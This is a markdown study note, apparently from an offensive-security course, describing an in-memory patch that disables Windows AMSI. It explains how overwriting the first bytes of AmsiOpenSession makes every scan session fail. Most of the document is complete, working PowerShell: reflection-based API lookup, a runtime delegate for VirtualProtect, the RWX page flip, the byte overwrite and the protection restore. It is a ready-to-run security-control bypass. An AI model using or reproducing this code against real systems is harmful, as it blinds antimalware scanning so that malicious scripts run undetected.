# 06.02 AMSI Binary Patch AmsiOpenSession XOR RAXRAX

> Section 7.4 · TEST RDX,RDX → XOR RAX,RAX (0x4885d2 → 0x4831c0)

## Overview

AmsiOpenSession starts with TEST RDX,RDX (3 bytes: 0x48 0x85 0xD2) followed by JE. Replace with XOR RAX,RAX (3 bytes: 0x48 0x31 0xC0) to always set the Zero Flag, triggering the JE branch that returns E_INVALIDARG — every call to AmsiOpenSession fails gracefully. Steps: LookupFunc to resolve amsi.dll!AmsiOpenSession address → VirtualProtect to 0x40 (RWX) → Marshal.Copy 3 bytes → VirtualProtect back to 0x20 (RX). Uses LookupFunc + getDelegateType helpers from the reflection shellcode runner.

## Steps

- **AmsiOpenSession disassembly** — first instruction is TEST RDX,RDX (0x4885d2); JE at +0x4b leads to `mov eax,80070057h; ret` (E_INVALIDARG).
- **XOR RAX,RAX (same 3 bytes)** — 0x4885d2 → 0x4831c0; XOR zeros RAX and sets ZF; JE is taken; E_INVALIDARG returned on every call.
- **LookupFunc** — resolves amsi.dll!AmsiOpenSession via GetModuleHandle + GetProcAddress through reflection.
- **VirtualProtect** — flip page to 0x40 (RWX) via getDelegateType delegate; write bytes; flip back to 0x20 (RX).
- **Copy bytes** — `$buf = [Byte[]] (0x48, 0x31, 0xC0); [Marshal]::Copy($buf, 0, $funcAddr, 3)`.
- **Restore** — `$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)` — Windows copies to PAGE_EXECUTE_WRITECOPY for current process only.

### LookupFunc

```powershell
# Resolves Win32 APIs through reflection — avoids P/Invoke DllImport declarations
function LookupFunc {

    Param ($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
@($moduleName)), $functionName))
}
```

### VirtualProtect + getDelegateType

```powershell
# Build a delegate type at runtime to call VirtualProtect without a static DllImport
function getDelegateType {

    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )

    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
[System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

    return $type.CreateType()
}

[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
```

### Copy bytes and restore

```powershell
# Overwrite the first 3 bytes: TEST RDX,RDX (0x4885d2) → XOR RAX,RAX (0x4831c0)
$buf = [Byte[]] (0x48, 0x31, 0xC0)  
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)

# Restore page protections — Windows uses PAGE_EXECUTE_WRITECOPY for this process only
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
```
